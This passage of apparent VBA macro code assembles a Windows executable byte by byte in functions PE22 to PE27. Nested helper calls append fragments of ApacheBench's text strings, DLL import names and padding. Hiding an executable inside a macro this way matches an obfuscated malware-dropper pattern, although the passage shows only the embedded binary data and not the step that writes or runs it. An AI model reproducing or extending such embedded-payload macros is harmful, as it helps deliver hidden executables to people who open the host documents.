    strPE = A(A(A(B(A(B(A(A(A(A(B(strPE, "ved,Time in ms"), 10), 0), 0), 0), "Cannot open CSV output file"), 0), "w"), 0), 0), 0)
    strPE = A(A(B(A(A(B(strPE, "  %d%%  %5I64d"), 10), 0), " 100%%  %5I64d (longest request)"), 10), 0)
    strPE = B(A(A(A(A(B(A(A(strPE, 0), 0), " 0%%  <0> (never)"), 10), 0), 0), 10), "Percentage of the requests ")
    strPE = B(A(A(A(B(strPE, "served within a certain time (ms)"), 10), 0), 0), "Total:      %5")
    strPE = B(A(A(A(A(A(B(strPE, "I64d %5I64d%5I64d"), 10), 0), 0), 0), 0), "Processing: %5I64d %5I64d%5I")
    strPE = B(A(A(A(A(A(B(A(A(A(A(A(B(strPE, "64d"), 10), 0), 0), 0), 0), "Connect:    %5I64d %5I64d%5I64d"), 10), 0), 0), 0), 0), "      ")
    strPE = B(A(A(A(B(strPE, "        min   avg   max"), 10), 0), 0), "WARNING: The median and ")
    strPE = B(strPE, "mean for the total time are not within a normal de")
    strPE = B(A(B(strPE, "viation"), 10), "        These results are probably not tha")
    strPE = B(A(A(A(A(A(A(A(A(A(B(strPE, "t reliable."), 10), 0), 0), 0), 0), 0), 0), 0), 0), "ERROR: The median and mean for")
    strPE = B(A(B(strPE, " the total time are more than twice the standard"), 10), " ")
    strPE = B(strPE, "      deviation apart. These results are NOT relia")
    strPE = B(A(A(B(strPE, "ble."), 10), 0), "WARNING: The median and mean for the waiting")
    strPE = B(A(B(strPE, " time are not within a normal deviation"), 10), "        Th")
    strPE = A(A(A(A(A(A(A(B(strPE, "ese results are probably not that reliable."), 10), 0), 0), 0), 0), 0), 0)
    strPE = B(strPE, "ERROR: The median and mean for the waiting time ar")
    strPE = B(A(B(strPE, "e more than twice the standard"), 10), "       deviation ap")
    strPE = B(A(A(A(A(A(A(A(A(B(strPE, "art. These results are NOT reliable."), 10), 0), 0), 0), 0), 0), 0), 0), "WARNIN")
    strPE = B(strPE, "G: The median and mean for the processing time are")
    strPE = B(A(B(strPE, " not within a normal deviation"), 10), "        These resul")
    strPE = B(A(A(A(A(B(strPE, "ts are probably not that reliable."), 10), 0), 0), 0), "ERROR: The m")
    strPE = B(strPE, "edian and mean for the processing time are more th")
    strPE = B(A(B(strPE, "an twice the standard"), 10), "       deviation apart. Thes")
    strPE = B(A(A(A(A(A(B(strPE, "e results are NOT reliable."), 10), 0), 0), 0), 0), "WARNING: The media")
    strPE = B(strPE, "n and mean for the initial connection time are not")
    strPE = B(A(B(strPE, " within a normal deviation"), 10), "        These results a")
    strPE = B(A(A(A(A(B(strPE, "re probably not that reliable."), 10), 0), 0), 0), "ERROR: The media")
    strPE = B(strPE, "n and mean for the initial connection time are mor")
    strPE = B(A(B(strPE, "e than twice the standard"), 10), "       deviation apart. ")
    strPE = B(A(A(A(A(A(B(strPE, "These results are NOT reliable."), 10), 0), 0), 0), 0), "Total:      %5")
    strPE = B(A(A(A(B(strPE, "I64d %4I64d %5.1f %6I64d %7I64d"), 10), 0), 0), "Waiting:    %5I6")
    strPE = B(A(A(A(B(strPE, "4d %4I64d %5.1f %6I64d %7I64d"), 10), 0), 0), "Processing: %5I64d")
    strPE = B(A(A(A(B(strPE, " %4I64d %5.1f %6I64d %7I64d"), 10), 0), 0), "Connect:    %5I64d %")
    strPE = B(A(A(A(B(strPE, "4I64d %5.1f %6I64d %7I64d"), 10), 0), 0), "              min  mea")

    PE22 = strPE
End Function

Private Function PE23() As String
   Dim strPE As String

    strPE = ""
    strPE = A(A(B(A(A(A(A(A(A(B(strPE, "n[+/-sd] median   max"), 10), 0), 0), 0), 0), 10), "Connection Times (ms)"), 10), 0)
    strPE = B(A(A(A(A(A(B(strPE, "                        %.2f kb/s total"), 10), 0), 0), 0), 0), "      ")
    strPE = B(A(A(B(strPE, "                  %.2f kb/s sent"), 10), 0), "Transfer rate:  ")
    strPE = B(A(A(B(strPE, "        %.2f [Kbytes/sec] received"), 10), 0), "Time per reque")
    strPE = B(strPE, "st:       %.3f [ms] (mean, across all concurrent r")
    strPE = B(A(A(A(A(B(strPE, "equests)"), 10), 0), 0), 0), "Time per request:       %.3f [ms] (mea")
    strPE = A(B(A(A(A(A(B(strPE, "n)"), 10), 0), 0), 0), "Requests per second:    %.2f [#/sec] (mean)"), 10)
    strPE = B(A(A(A(A(A(B(A(A(A(A(strPE, 0), 0), 0), 0), "HTML transferred:       %I64d bytes"), 10), 0), 0), 0), 0), "Total ")
    strPE = B(A(A(A(B(strPE, "PUT:              %I64d"), 10), 0), 0), "Total POSTed:           ")
    strPE = B(A(A(A(A(A(B(A(A(A(B(strPE, "%I64d"), 10), 0), 0), "Total transferred:      %I64d bytes"), 10), 0), 0), 0), 0), "Ke")
    strPE = B(A(A(B(strPE, "ep-Alive requests:    %d"), 10), 0), "Non-2xx responses:      ")
    strPE = B(A(A(B(A(A(B(strPE, "%d"), 10), 0), "Write errors:           %d"), 10), 0), "   (Connect: %d, R")
    strPE = B(A(A(A(B(strPE, "eceive: %d, Length: %d, Exceptions: %d)"), 10), 0), 0), "Failed r")
    strPE = B(A(A(B(A(A(B(strPE, "equests:        %d"), 10), 0), "Complete requests:      %d"), 10), 0), "Ti")
    strPE = B(A(A(A(A(B(strPE, "me taken for tests:   %.3f seconds"), 10), 0), 0), 0), "Concurrency ")
    strPE = A(A(B(A(A(B(strPE, "Level:      %d"), 10), 0), "Document Length:        %u bytes"), 10), 0)
    strPE = B(A(A(B(A(A(strPE, 0), 0), "Document Path:          %s"), 10), 0), "Server Port:        ")
    strPE = B(A(A(B(A(A(A(A(A(B(strPE, "    %hu"), 10), 0), 0), 0), 0), "Server Hostname:        %s"), 10), 0), "Server Sof")
    strPE = B(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(B(strPE, "tware:        %s"), 10), 0), 10), 10), 0), 0), "</table>"), 10), 0), 0), 0), 0), 0), 0), 0), "<tr %s><th %")
    strPE = B(strPE, "s>Total:</th><td %s>%5I64d</td><td %s>%5I64d</td><")
    strPE = B(A(A(A(A(B(strPE, "td %s>%5I64d</td></tr>"), 10), 0), 0), 0), "<tr %s><th %s>Processing")
    strPE = B(strPE, ":</th><td %s>%5I64d</td><td %s>%5I64d</td><td %s>%")
    strPE = B(A(A(A(A(A(A(A(B(strPE, "5I64d</td></tr>"), 10), 0), 0), 0), 0), 0), 0), "<tr %s><th %s>Connect:</th><")
    strPE = B(strPE, "td %s>%5I64d</td><td %s>%5I64d</td><td %s>%5I64d</")
    strPE = B(A(A(B(strPE, "td></tr>"), 10), 0), "<tr %s><th %s>&nbsp;</th> <th %s>min</th")
    strPE = B(A(A(B(strPE, ">   <th %s>avg</th>   <th %s>max</th></tr>"), 10), 0), "<tr %s")
    strPE = B(strPE, "><th %s colspan=4>Connnection Times (ms)</th></tr>")
    strPE = B(A(A(A(A(strPE, 10), 0), 0), 0), "<tr %s><td colspan=2 %s>&nbsp;</td><td colspan")
    strPE = B(A(A(A(B(strPE, "=2 %s>%.2f kb/s total</td></tr>"), 10), 0), 0), "<tr %s><td colsp")
    strPE = B(strPE, "an=2 %s>&nbsp;</td><td colspan=2 %s>%.2f kb/s sent")
    strPE = B(A(A(A(A(B(strPE, "</td></tr>"), 10), 0), 0), 0), "<tr %s><th colspan=2 %s>Transfer rat")
    strPE = B(strPE, "e:</th><td colspan=2 %s>%.2f kb/s received</td></t")
    strPE = B(A(A(A(A(A(A(A(A(B(strPE, "r>"), 10), 0), 0), 0), 0), 0), 0), 0), "<tr %s><th colspan=2 %s>Requests per sec")
    strPE = B(A(A(A(A(A(A(A(A(B(strPE, "ond:</th><td colspan=2 %s>%.2f</td></tr>"), 10), 0), 0), 0), 0), 0), 0), 0), "<t")
    strPE = B(strPE, "r %s><th colspan=2 %s>HTML transferred:</th><td co")
    strPE = B(A(A(A(A(B(strPE, "lspan=2 %s>%I64d bytes</td></tr>"), 10), 0), 0), 0), "<tr %s><th col")
    strPE = B(strPE, "span=2 %s>Total PUT:</th><td colspan=2 %s>%I64d</t")
    strPE = B(A(A(A(A(A(A(A(A(A(B(strPE, "d></tr>"), 10), 0), 0), 0), 0), 0), 0), 0), 0), "<tr %s><th colspan=2 %s>Total POST")
    strPE = B(A(A(A(A(A(A(B(strPE, "ed:</th><td colspan=2 %s>%I64d</td></tr>"), 10), 0), 0), 0), 0), 0), "<tr ")
    strPE = B(strPE, "%s><th colspan=2 %s>Total transferred:</th><td col")
    strPE = B(A(A(A(B(strPE, "span=2 %s>%I64d bytes</td></tr>"), 10), 0), 0), "<tr %s><th colsp")
    strPE = B(strPE, "an=2 %s>Keep-Alive requests:</th><td colspan=2 %s>")
    strPE = B(A(A(B(strPE, "%d</td></tr>"), 10), 0), "<tr %s><th colspan=2 %s>Non-2xx resp")
    strPE = B(A(A(A(A(B(strPE, "onses:</th><td colspan=2 %s>%d</td></tr>"), 10), 0), 0), 0), "<tr %s")
    strPE = B(strPE, "><td colspan=4 %s >   (Connect: %d, Length: %d, Ex")
    strPE = B(A(A(A(A(A(A(A(A(A(B(strPE, "ceptions: %d)</td></tr>"), 10), 0), 0), 0), 0), 0), 0), 0), 0), "<tr %s><th colspan")
    strPE = B(strPE, "=2 %s>Failed requests:</th><td colspan=2 %s>%d</td")
    strPE = B(A(A(A(A(A(A(B(strPE, "></tr>"), 10), 0), 0), 0), 0), 0), "<tr %s><th colspan=2 %s>Complete reque")
    strPE = B(A(A(A(A(B(strPE, "sts:</th><td colspan=2 %s>%d</td></tr>"), 10), 0), 0), 0), "<tr %s><")

    PE23 = strPE
End Function

Private Function PE24() As String
   Dim strPE As String

    strPE = ""
    strPE = B(strPE, "th colspan=2 %s>Time taken for tests:</th><td cols")
    strPE = B(A(A(A(A(A(A(A(B(strPE, "pan=2 %s>%.3f seconds</td></tr>"), 10), 0), 0), 0), 0), 0), 0), "<tr %s><th c")
    strPE = B(strPE, "olspan=2 %s>Concurrency Level:</th><td colspan=2 %")
    strPE = B(A(A(A(A(B(strPE, "s>%d</td></tr>"), 10), 0), 0), 0), "<tr %s><th colspan=2 %s>Document")
    strPE = A(A(B(strPE, " Length:</th><td colspan=2 %s>%u bytes</td></tr>"), 10), 0)
    strPE = B(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), "<tr %s><th colspan=2 %s>Document Path:</th><")
    strPE = B(A(A(A(A(A(A(A(A(B(strPE, "td colspan=2 %s>%s</td></tr>"), 10), 0), 0), 0), 0), 0), 0), 0), "<tr %s><th col")
    strPE = B(strPE, "span=2 %s>Server Port:</th><td colspan=2 %s>%hu</t")
    strPE = B(A(A(A(A(A(A(A(A(A(B(strPE, "d></tr>"), 10), 0), 0), 0), 0), 0), 0), 0), 0), "<tr %s><th colspan=2 %s>Server Hos")
    strPE = B(A(A(A(A(A(A(B(strPE, "tname:</th><td colspan=2 %s>%s</td></tr>"), 10), 0), 0), 0), 0), 0), "<tr ")
    strPE = B(strPE, "%s><th colspan=2 %s>Server Software:</th><td colsp")
    strPE = B(A(A(A(A(B(A(A(A(A(B(strPE, "an=2 %s>%s</td></tr>"), 10), 0), 10), 10), "<table %s>"), 10), 0), 0), 0), "socket recei")
    strPE = B(A(B(A(A(B(A(A(A(B(strPE, "ve buffer"), 0), 0), 0), "socket send buffer"), 0), 0), "socket nonblock"), 0), "so")
    strPE = B(A(B(A(A(A(B(A(A(B(strPE, "cket"), 0), 0), "Completed %d requests"), 10), 0), 0), "Content-length:"), 0), "Cont")
    strPE = B(A(A(B(A(A(B(A(B(strPE, "ent-Length:"), 0), "keep-alive"), 0), 0), "Keep-Alive"), 0), 0), "LOG: Response ")
    strPE = A(B(A(A(A(A(A(B(strPE, "code = %s"), 10), 0), 0), 0), 0), "WARNING: Response code not 2xx (%s)"), 10)
    strPE = B(A(A(A(A(A(A(A(A(A(B(A(A(A(A(B(A(B(A(A(A(A(strPE, 0), 0), 0), 0), "500"), 0), "HTTP"), 0), 0), 0), 0), "Server:"), 0), 13), 10), 13), 10), 0), 0), 0), 0), "LOG: header receiv")
    strPE = B(A(A(A(A(B(A(B(A(B(A(A(A(A(B(A(B(strPE, "ed:"), 10), "%s"), 10), 0), 0), 0), "apr_socket_recv"), 0), "</p>"), 10), "<p>"), 10), 0), 0), 0), " Licensed to")
    strPE = B(strPE, " The Apache Software Foundation, http://www.apache")
    strPE = B(A(A(A(A(A(A(A(A(A(B(strPE, ".org/<br>"), 10), 0), 0), 0), 0), 0), 0), 0), 0), " Copyright 1996 Adam Twiss, Zeus")
    strPE = B(A(A(A(B(strPE, " Technology Ltd, http://www.zeustech.net/<br>"), 10), 0), 0), " T")
    strPE = B(strPE, "his is ApacheBench, Version %s <i>&lt;%s&gt;</i><b")
    strPE = B(A(A(A(A(A(A(A(A(A(B(A(B(A(A(B(strPE, "r>"), 10), 0), "$Revision: 655654 $"), 0), "<p>"), 10), 0), 0), 0), 0), 0), 0), 0), 0), "Licensed to Th")
    strPE = B(strPE, "e Apache Software Foundation, http://www.apache.or")
    strPE = B(A(A(A(A(A(A(B(strPE, "g/"), 10), 0), 0), 0), 0), 0), "Copyright 1996 Adam Twiss, Zeus Technology")
    strPE = B(A(A(A(A(B(strPE, " Ltd, http://www.zeustech.net/"), 10), 0), 0), 0), "This is ApacheBe")
    strPE = B(A(A(A(B(A(A(A(A(A(B(strPE, "nch, Version %s"), 10), 0), 0), 0), 0), "2.3 <$Revision: 655654 $>"), 0), 0), 0), "  ")
    strPE = B(strPE, "  -h              Display usage information (this ")
    strPE = B(A(A(A(A(B(strPE, "message)"), 10), 0), 0), 0), "    -r              Don't exit on sock")
    strPE = B(A(A(A(A(B(strPE, "et receive errors."), 10), 0), 0), 0), "    -e filename     Output C")
    strPE = B(A(A(A(A(A(B(strPE, "SV file with percentages served"), 10), 0), 0), 0), 0), "    -g filenam")
    strPE = B(strPE, "e     Output collected data to gnuplot format file")
    strPE = B(A(A(A(A(A(A(A(B(strPE, "."), 10), 0), 0), 0), 0), 0), 0), "    -S              Do not show confidence")
    strPE = B(A(A(A(A(A(B(strPE, " estimators and warnings."), 10), 0), 0), 0), 0), "    -d              ")
    strPE = B(A(A(A(B(strPE, "Do not show percentiles served table."), 10), 0), 0), "    -k    ")
    strPE = B(A(A(B(strPE, "          Use HTTP KeepAlive feature"), 10), 0), "    -V      ")
    strPE = B(A(A(A(B(strPE, "        Print version number and exit"), 10), 0), 0), "    -X pro")
    strPE = B(A(A(B(strPE, "xy:port   Proxyserver and port number to use"), 10), 0), "    ")
    strPE = B(strPE, "-P attribute    Add Basic Proxy Authentication, th")
    strPE = B(A(A(A(A(A(A(B(strPE, "e attributes"), 10), 0), 0), 0), 0), 0), "                    are a colon ")
    strPE = B(A(A(A(A(A(A(A(A(B(strPE, "separated username and password."), 10), 0), 0), 0), 0), 0), 0), 0), "    -A att")
    strPE = B(strPE, "ribute    Add Basic WWW Authentication, the attrib")
    strPE = B(A(A(A(A(A(A(A(A(B(strPE, "utes"), 10), 0), 0), 0), 0), 0), 0), 0), "                    Inserted after all")
    strPE = B(A(A(A(A(A(A(A(A(B(strPE, " normal header lines. (repeatable)"), 10), 0), 0), 0), 0), 0), 0), 0), "    -H a")
    strPE = B(strPE, "ttribute    Add Arbitrary header line, eg. 'Accept")
    strPE = B(A(A(A(A(A(A(B(strPE, "-Encoding: gzip'"), 10), 0), 0), 0), 0), 0), "    -C attribute    Add cook")
    strPE = B(A(A(B(strPE, "ie, eg. 'Apache=1234. (repeatable)"), 10), 0), "    -z attribu")
    strPE = A(A(A(A(A(B(strPE, "tes   String to insert as td or th attributes"), 10), 0), 0), 0), 0)
    strPE = B(strPE, "    -y attributes   String to insert as tr attribu")

    PE24 = strPE
End Function

Private Function PE25() As String
   Dim strPE As String

    strPE = ""
    strPE = B(A(A(A(B(strPE, "tes"), 10), 0), 0), "    -x attributes   String to insert as tabl")
    strPE = B(A(A(A(A(B(strPE, "e attributes"), 10), 0), 0), 0), "    -i              Use HEAD inste")
    strPE = B(A(A(A(A(A(B(strPE, "ad of GET"), 10), 0), 0), 0), 0), "    -w              Print out result")
    strPE = B(A(A(A(A(B(strPE, "s in HTML tables"), 10), 0), 0), 0), "    -v verbosity    How much t")
    strPE = B(A(A(B(strPE, "roubleshooting info to print"), 10), 0), "                    ")
    strPE = B(A(A(A(A(A(B(strPE, "Default is 'text/plain'"), 10), 0), 0), 0), 0), "                    'a")
    strPE = B(A(A(A(A(A(B(strPE, "pplication/x-www-form-urlencoded'"), 10), 0), 0), 0), 0), "    -T conte")
    strPE = B(A(A(A(A(B(strPE, "nt-type Content-type header for POSTing, eg."), 10), 0), 0), 0), "  ")
    strPE = B(strPE, "  -u putfile      File containing data to PUT. Rem")
    strPE = B(A(A(A(A(A(A(A(A(B(strPE, "ember also to set -T"), 10), 0), 0), 0), 0), 0), 0), 0), "    -p postfile     Fi")
    strPE = B(strPE, "le containing data to POST. Remember also to set -")
    strPE = B(A(A(A(B(strPE, "T"), 10), 0), 0), "    -b windowsize   Size of TCP send/receive b")
    strPE = B(A(A(A(B(strPE, "uffer, in bytes"), 10), 0), 0), "    -t timelimit    Seconds to m")
    strPE = B(A(A(B(strPE, "ax. wait for responses"), 10), 0), "    -c concurrency  Number")
    strPE = B(A(A(A(A(A(B(strPE, " of multiple requests to make"), 10), 0), 0), 0), 0), "    -n requests ")
    strPE = A(A(B(A(A(A(B(strPE, "    Number of requests to perform"), 10), 0), 0), "Options are:"), 10), 0)
    strPE = B(A(A(strPE, 0), 0), "Usage: %s [options] [http://]hostname[:port]/pat")
    strPE = B(A(A(A(B(A(B(A(A(A(B(strPE, "h"), 10), 0), 0), ":%d"), 0), "SSL not compiled in; no https support"), 10), 0), 0), "ht")
    strPE = B(A(B(A(A(A(A(B(A(A(A(A(B(strPE, "tps://"), 0), 0), 0), 0), "[%s]"), 0), 0), 0), 0), "http://"), 0), "ab: Could not read POST ")
    strPE = B(A(A(A(B(strPE, "data file: %s"), 10), 0), 0), "ab: Could not allocate POST data b")
    strPE = B(A(A(A(A(A(B(strPE, "uffer"), 10), 0), 0), 0), 0), "ab: Could not stat POST data file (%s): ")
    strPE = B(A(A(B(A(A(B(strPE, "%s"), 10), 0), "ab: Could not open POST data file (%s): %s"), 10), 0), "ap")
    strPE = B(A(A(A(A(B(A(A(A(B(A(A(A(A(B(A(B(A(B(strPE, "r_global_pool"), 0), "%d.%d%c"), 0), "****"), 0), 0), 0), 0), "%3d%c"), 0), 0), 0), "%3d "), 0), 0), 0), 0), "  - ")
    strPE = B(A(A(A(A(B(A(A(B(A(A(A(A(strPE, 0), 0), 0), 0), "KMGTPE"), 0), 0), "%s: illegal option -- %c"), 10), 0), 0), 0), "%s: option")
    strPE = A(A(B(A(A(A(B(strPE, " requires an argument -- %c"), 10), 0), 0), "CommandLineToArgvW"), 0), 0)
    strPE = B(A(A(A(A(B(A(B(A(B(A(A(B(strPE, "apr_initialize"), 0), 0), "0123456789."), 0), "0.0.0.0"), 0), "bogus %p"), 0), 0), 0), 0), "I6")
    strPE = B(A(B(A(A(A(A(B(strPE, "4d"), 0), 0), 0), 0), "No host data of that type was found"), 0), "Host not")
    strPE = B(A(A(A(B(A(A(B(strPE, " found"), 0), 0), "Graceful shutdown in progress"), 0), 0), 0), "WSAStartup")
    strPE = A(A(A(A(B(A(A(A(B(strPE, " not yet called"), 0), 0), 0), "Winsock version out of range"), 0), 0), 0), 0)
    strPE = B(A(A(A(B(strPE, "Network system is unavailable"), 0), 0), 0), "Too many levels of")
    strPE = B(A(A(A(B(A(A(A(B(strPE, " remote in path"), 0), 0), 0), "Stale NFS file handle"), 0), 0), 0), "Disc quo")
    strPE = B(A(A(B(A(A(B(A(B(strPE, "ta exceeded"), 0), "Too many users"), 0), 0), "Too many processes"), 0), 0), "Di")
    strPE = B(A(A(A(A(B(A(B(strPE, "rectory not empty"), 0), "No route to host"), 0), 0), 0), 0), "Host is down")
    strPE = B(A(A(B(A(A(A(A(strPE, 0), 0), 0), 0), "File name too long"), 0), 0), "Too many levels of symboli")
    strPE = B(A(A(B(A(A(A(B(strPE, "c links"), 0), 0), 0), "Connection refused"), 0), 0), "Connection timed out")
    strPE = B(A(A(A(B(A(A(A(A(strPE, 0), 0), 0), 0), "Too many references, can't splice"), 0), 0), 0), "Can't send")
    strPE = A(B(A(A(A(A(B(strPE, " after socket shutdown"), 0), 0), 0), 0), "Socket is not connected"), 0)
    strPE = B(A(B(strPE, "Socket is already connected"), 0), "No buffer space availa")
    strPE = B(A(A(A(A(B(A(A(A(B(strPE, "ble"), 0), 0), 0), "Connection reset by peer"), 0), 0), 0), 0), "Software caused ")
    strPE = B(A(A(A(A(B(A(A(A(A(B(strPE, "connection abort"), 0), 0), 0), 0), "Net connection reset"), 0), 0), 0), 0), "Networ")
    strPE = B(A(B(A(A(B(strPE, "k is unreachable"), 0), 0), "Network is down"), 0), "Can't assign req")
    strPE = B(A(A(B(A(A(B(strPE, "uested address"), 0), 0), "Address already in use"), 0), 0), "Address fa")
    strPE = B(A(A(A(A(B(strPE, "mily not supported"), 0), 0), 0), 0), "Protocol family not supporte")
    strPE = B(A(A(A(B(A(A(A(B(strPE, "d"), 0), 0), 0), "Operation not supported on socket"), 0), 0), 0), "Socket typ")
    strPE = B(A(A(B(A(A(A(B(strPE, "e not supported"), 0), 0), 0), "Protocol not supported"), 0), 0), "Bad prot")
    strPE = B(A(A(B(A(B(strPE, "ocol option"), 0), "Protocol wrong type for socket"), 0), 0), "Messag")
    strPE = B(A(A(A(A(B(A(A(A(A(B(strPE, "e too long"), 0), 0), 0), 0), "Destination address required"), 0), 0), 0), 0), "Sock")
    strPE = B(A(A(B(strPE, "et operation on non-socket"), 0), 0), "Operation already in p")
    strPE = B(A(A(A(B(A(A(A(B(strPE, "rogress"), 0), 0), 0), "Operation now in progress"), 0), 0), 0), "Operation wo")

    PE25 = strPE
End Function

Private Function PE26() As String
   Dim strPE As String

    strPE = ""
    strPE = B(A(A(A(B(A(A(A(B(strPE, "uld block"), 0), 0), 0), "Too many open sockets"), 0), 0), 0), "Invalid argume")
    strPE = B(A(A(A(B(A(B(A(A(A(A(B(strPE, "nt"), 0), 0), 0), 0), "Bad address"), 0), "Permission denied"), 0), 0), 0), "Bad file num")
    strPE = B(A(B(A(B(strPE, "ber"), 0), "Interrupted system call"), 0), "APR does not understan")
    strPE = A(A(B(A(B(strPE, "d this error code"), 0), "Error string not specified yet"), 0), 0)
    strPE = B(A(A(B(strPE, "passwords do not match"), 0), 0), "This function has not been")
    strPE = B(A(A(A(A(A(B(strPE, " implemented on this platform"), 0), 0), 0), 0), 0), "There is no erro")
    strPE = A(B(strPE, "r, this value signifies an initialized error code"), 0)
    strPE = A(B(A(A(strPE, 0), 0), "Shared memory is implemented using a key system"), 0)
    strPE = B(A(A(A(A(B(strPE, "Shared memory is implemented using files"), 0), 0), 0), 0), "Shared")
    strPE = B(A(A(A(A(B(strPE, " memory is implemented anonymously"), 0), 0), 0), 0), "Could not fi")
    strPE = B(A(A(A(B(strPE, "nd specified socket in poll list."), 0), 0), 0), "End of file fo")
    strPE = B(A(A(A(B(strPE, "und"), 0), 0), 0), "Missing parameter for the specified command ")
    strPE = B(A(B(strPE, "line option"), 0), "Bad character specified on command lin")
    strPE = B(A(B(strPE, "e"), 0), "Partial results are valid but processing is inco")
    strPE = B(A(A(A(B(A(A(B(strPE, "mplete"), 0), 0), "The timeout specified has expired"), 0), 0), 0), "The sp")
    strPE = B(A(A(A(B(strPE, "ecified child process is not done executing"), 0), 0), 0), "The ")
    strPE = B(A(A(A(B(strPE, "specified child process is done executing"), 0), 0), 0), "The sp")
    strPE = B(A(A(A(A(B(strPE, "ecified thread is not detached"), 0), 0), 0), 0), "The specified th")
    strPE = B(A(A(A(A(A(A(A(A(B(strPE, "read is detached"), 0), 0), 0), 0), 0), 0), 0), 0), "Your code just forked, and")
    strPE = B(strPE, " you are currently executing in the parent process")
    strPE = B(A(A(A(A(strPE, 0), 0), 0), 0), "Your code just forked, and you are currently e")
    strPE = B(A(A(B(A(B(strPE, "xecuting in the child process"), 0), "Internal error"), 0), 0), "The ")
    strPE = B(A(A(B(strPE, "process is not recognized."), 0), 0), "The given path contain")
    strPE = B(A(A(A(A(B(strPE, "ed wildcard characters"), 0), 0), 0), 0), "The given path is misfor")
    strPE = B(A(A(B(strPE, "matted or contained invalid characters"), 0), 0), "The given ")
    strPE = B(A(A(B(strPE, "path was above the root path"), 0), 0), "The given path is in")
    strPE = B(A(A(B(A(A(A(A(B(strPE, "complete"), 0), 0), 0), 0), "The given path is relative"), 0), 0), "The given ")
    strPE = B(A(A(B(strPE, "path is absolute"), 0), 0), "The specified network mask is in")
    strPE = B(A(A(A(A(B(A(A(B(strPE, "valid."), 0), 0), "The specified IP address is invalid."), 0), 0), 0), 0), "DS")
    strPE = B(A(B(strPE, "O load failed"), 0), "No shared memory is currently availa")
    strPE = B(A(B(strPE, "ble"), 0), "No thread key structure was provided and one w")
    strPE = B(A(A(B(strPE, "as required."), 0), 0), "No thread was provided and one was r")
    strPE = B(A(A(A(A(B(strPE, "equired."), 0), 0), 0), 0), "No socket was provided and one was req")
    strPE = B(A(A(A(A(B(strPE, "uired."), 0), 0), 0), 0), "No poll structure was provided and one w")
    strPE = B(A(A(A(A(B(strPE, "as required."), 0), 0), 0), 0), "No lock was provided and one was r")
    strPE = B(A(A(B(strPE, "equired."), 0), 0), "No directory was provided and one was re")
    strPE = B(A(B(strPE, "quired."), 0), "No time was provided and one was required.")
    strPE = A(A(A(B(A(A(strPE, 0), 0), "No process was provided and one was required."), 0), 0), 0)
    strPE = B(A(A(B(strPE, "An invalid socket was returned"), 0), 0), "An invalid date ha")
    strPE = B(A(A(A(B(strPE, "s been provided"), 0), 0), 0), "A new pool could not be created.")
    strPE = A(B(A(B(A(B(A(B(A(B(A(A(A(A(B(A(A(A(A(strPE, 0), 0), 0), 0), "Unrecognized Win32 error code %d"), 0), 0), 0), 0), "\"), 0), "\"), 0), "?"), 0), "\"), 0), "U"), 0)
    strPE = B(A(A(A(A(B(A(A(A(A(A(B(A(B(A(B(A(B(A(A(A(A(A(B(A(B(A(B(strPE, "N"), 0), "C"), 0), "\"), 0), 0), 0), 0), 0), "\"), 0), "\"), 0), "?"), 0), "\"), 0), 0), 0), 0), 0), "CancelIo"), 0), 0), 0), 0), "GetCompressedFil")
    strPE = B(A(A(B(A(A(B(strPE, "eSizeA"), 0), 0), "GetCompressedFileSizeW"), 0), 0), "ZwQueryInformation")
    strPE = B(A(A(A(B(A(B(A(A(B(strPE, "File"), 0), 0), "GetSecurityInfo"), 0), "GetNamedSecurityInfoA"), 0), 0), 0), "GetN")
    strPE = B(A(A(A(A(A(B(A(B(A(B(A(B(A(A(A(B(strPE, "amedSecurityInfoW"), 0), 0), 0), "U"), 0), "N"), 0), "C"), 0), "\"), 0), 0), 0), 0), 0), "GetEffectiveRights")
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(strPE, "FromAclW"), 0), 0), 0), 0), 0), 0), 255), 255), 255), 255), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = B(A(B(A(A(B(A(B(A(A(A(B(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 255), 255), 255), 255), "ntdll.dll"), 0), 0), 0), "shell32"), 0), "ws2_32"), 0), 0), "mswsock"), 0), "adva")
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(B(strPE, "pi32"), 0), 0), 0), 0), "kernel32"), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 1), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)

    PE26 = strPE
End Function

Private Function PE27() As String
   Dim strPE As String

    strPE = ""
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
